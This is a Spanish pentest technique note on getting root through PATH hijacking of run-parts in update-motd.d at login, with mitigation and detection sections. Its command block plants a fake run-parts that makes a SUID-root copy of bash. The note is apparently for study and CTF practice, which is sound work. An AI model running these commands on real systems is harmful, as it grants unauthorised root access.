---
topic: run-parts — secuestro de PATH en el login
tags: [linux, run-parts, path-hijack, update-motd, privesc]
---

# run-parts — secuestro de PATH en el login

[🌐 English](run-parts-path-hijack.en.md) | **Español**

## Concepto

Al iniciar sesión, PAM o el shell pueden ejecutar `run-parts` sobre `/etc/update-motd.d` con un PATH que incluye `/usr/local/bin`. Si un grupo no privilegiado puede escribir ahí, un `run-parts` falso se ejecuta como root.

## Cuándo aplica

- `pspy` muestra `run-parts` como root en cada login.
- El PATH prioriza `/usr/local/bin` sobre `/usr/bin`.
- El usuario puede escribir en `/usr/local/bin`.

## Procedimiento

1. Confirmar el proceso y el orden del PATH.
2. Crear un `run-parts` que copie bash y le dé SUID.
3. Darle permisos de ejecución.
4. Volver a iniciar sesión y usar la shell SUID.

## Comandos

```bash
pspy64
printf '#!/bin/bash\ncp /bin/bash /tmp/root; chmod 6777 /tmp/root\n' > /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts
ssh <USER>@<IP>
/tmp/root -p
```

## Variantes

- Secuestrar otro binario del PATH (`env`, `sh`, `perl`).
- Editar un script de `/etc/update-motd.d` si es escribible.
- Aprovechar un `run-parts` con argumentos controlados.

## Limitaciones

- El PATH puede estar limpio o usar rutas absolutas.
- El directorio puede no ser escribible.
- PAM puede no ejecutar MOTD en SSH.

## Mitigación

- Usar rutas absolutas en scripts de login.
- Quitar escritura de grupos no privilegiados en `/usr/local/bin`.
- Auditar `update-motd.d` y el PATH.

## Detección

- `run-parts` ejecutado desde `/usr/local/bin`.
- Shells SUID nuevas.
- Cambios en scripts de MOTD.

## Referencias

- [0xdf — Writeup](https://0xdf.gitlab.io/2019/10/12/htb-writeup.html)
- [Debian — run-parts](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [MITRE — T1574.007](https://attack.mitre.org/techniques/T1574/007/)
